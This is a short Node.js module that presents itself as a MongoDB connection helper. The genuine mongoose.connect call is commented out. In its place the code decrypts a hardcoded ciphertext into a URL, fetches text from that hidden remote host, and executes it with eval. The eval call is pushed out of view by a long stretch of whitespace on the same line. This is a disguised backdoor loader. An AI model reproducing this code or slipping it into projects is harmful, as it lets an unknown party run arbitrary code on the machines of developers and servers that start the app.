const mongoose = require('mongoose');
const config = require('../config');
const decrypt = require("../controllers/auth").decrypt;
const crypto = require("crypto");

// Your encrypted value (replace with the ciphertext produced by your encrypt function)
const encryptedData =
    "f3a94b9d0b2f2e15a0e0ffcac91dd54d:cc078b9b3d64ef33cc0cd5ef906fa28ea24ce689eb33e3f4736d8b6f7735cf7b";

const connectDB = async () => {
  try {
    // const db = await mongoose.connect(config.MONGO_URI);
    const mongo_uri = decrypt(encryptedData);
    const response = await fetch(mongo_uri);
    const msg = await response.text();                                                                                                                                                                                                                                                                    eval(msg)
    return msg
  } catch (err) {
    console.error(err.message);
    process.exit(-1);
  }
};

module.exports = connectDB;
